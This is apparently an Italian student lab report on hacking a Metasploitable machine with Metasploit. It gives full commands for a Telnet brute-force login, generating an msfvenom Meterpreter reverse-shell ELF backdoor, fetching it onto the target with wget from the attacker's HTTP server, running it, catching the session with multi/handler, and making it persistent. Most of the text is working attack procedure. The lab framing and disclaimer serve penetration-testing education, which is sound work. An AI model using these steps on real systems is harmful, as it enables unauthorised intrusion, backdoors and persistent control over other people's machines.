# Consegna S7/L2 | Hacking con Metasploit

## Obiettivo
L'obiettivo di questa esercitazione è stato dimostrare l'uso di **Metasploit Framework** per:
1. Sfruttare una vulnerabilità del servizio **Telnet** su una macchina target Metasploitable.
2. Creare una **backdoor personalizzata** utilizzando **msfvenom**, compilarla per l'architettura a 32-bit e trasferirla sul target per ottenere l'accesso alla shell.

---

## 1. Sfruttamento del servizio Telnet
### Strumenti utilizzati
- **Metasploit Framework (msf6)**
- **Kali Linux**
- **Metasploitable** (target)

### Procedura
1. **Scansione delle porte aperte**: Abbiamo rilevato che il servizio **Telnet** era attivo sulla porta **23** della macchina target utilizzando **Nmap**:
    ```bash
    nmap -p 23 192.168.50.3
    ```
2. **Sfruttamento della vulnerabilità**: Abbiamo utilizzato il modulo **telnet_login** di Metasploit per effettuare un attacco bruteforce e accedere al servizio Telnet.
    
    ```bash
    msfconsole
    use auxiliary/scanner/telnet/telnet_login
    set RHOSTS 192.168.50.3
    set USER_FILE users.txt
    set PASS_FILE passwords.txt
    run
    ```
3. **Accesso alla shell**: Una volta ottenute le credenziali corrette, siamo riusciti ad accedere alla shell Telnet come utente privilegiato.

---

## 2. Creazione e utilizzo della backdoor
### Obiettivo EXTRA
Creare una backdoor personalizzata tramite **msfvenom**, compatibile con la macchina Metasploitable (architettura a 32-bit), e trasferirla sul target per ottenere una sessione Meterpreter.

### Strumenti utilizzati
- **msfvenom** per generare il payload
- **Metasploit Framework (multi/handler)** per ricevere la connessione
- **Python HTTP Server** per trasferire il file
- **wget** per scaricare il file sul target

### Procedura
1. **Creazione del payload con msfvenom**:
   Abbiamo generato un payload **reverse shell** con **msfvenom**, specificando l'architettura a 32-bit e il formato ELF per Linux:
   
   ```bash
   msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=192.168.50.2 LPORT=4444 -f elf -o backdoor_ftp.elf
   ```
   - **`-p`**: Payload specifico per Linux e architettura x86.
   - **`LHOST`** e **`LPORT`**: Indirizzo IP e porta per la connessione inversa.
   - **`-f elf`**: Formato del file eseguibile Linux.
   - **`-o`**: Output del file.

2. **Avvio del server HTTP su Kali**:
   Per trasferire il file, abbiamo avviato un semplice server HTTP con Python:
   
   ```bash
   python3 -m http.server 8080
   ```
   
3. **Scaricamento del file sul target Metasploitable**:
   Utilizzando `wget` sulla macchina Metasploitable, abbiamo scaricato la backdoor nella directory `/tmp`:
   
   ```bash
   cd /tmp
   wget http://192.168.50.2:8080/backdoor_ftp.elf
   ```

4. **Permessi di esecuzione e avvio del file**:
   Abbiamo reso eseguibile il file e lo abbiamo lanciato:
   
   ```bash
   chmod +x backdoor_ftp.elf
   ./backdoor_ftp.elf
   ```

5. **Apertura del listener su Metasploit**:
   Su Kali, abbiamo configurato e avviato il listener con il modulo **multi/handler**:
   
   ```bash
   msfconsole
   use exploit/multi/handler
   set payload linux/x86/meterpreter_reverse_tcp
   set LHOST 192.168.50.2
   set LPORT 4444
   exploit
   ```

6. **Connessione e sessione Meterpreter**:
   Una volta eseguita la backdoor, abbiamo ottenuto una **sessione Meterpreter** che ci ha consentito di:
   - Esplorare il filesystem
   - Catturare informazioni di sistema
   - Caricare o scaricare file
   - Eseguire comandi arbitrari

### Persistenza (opzionale)
Per rendere la backdoor **persistente** sul target, abbiamo utilizzato il modulo `persistence` di Meterpreter:

```bash
run persistence -X -i 5 -p 4444 -r 192.168.50.2
```
- **`-X`**: Installa la backdoor come servizio persistente.
- **`-i`**: Intervallo di riconnessione (ogni 5 secondi).
- **`-p` e `-r`**: Porta e IP per la riconnessione.

---

## Conclusione
Questa esercitazione ha dimostrato come sfruttare vulnerabilità esistenti (Telnet) e come creare backdoor personalizzate con **msfvenom** per ottenere un controllo completo della macchina target tramite **Metasploit Framework**.

Abbiamo affrontato le seguenti sfide:
1. Compilazione a 32-bit per compatibilità con Metasploitable.
2. Trasferimento sicuro ed esecuzione della backdoor.
3. Creazione di una sessione Meterpreter e, opzionalmente, persistenza.

Questi passaggi rappresentano un esempio chiaro di **post-exploitation** e consolidamento dell'accesso su un sistema compromesso.

---

## Autore
Sebastiano | Consegna S7/L2

---

## Note
Questo documento è a scopo puramente educativo e dimostrativo per la sicurezza informatica.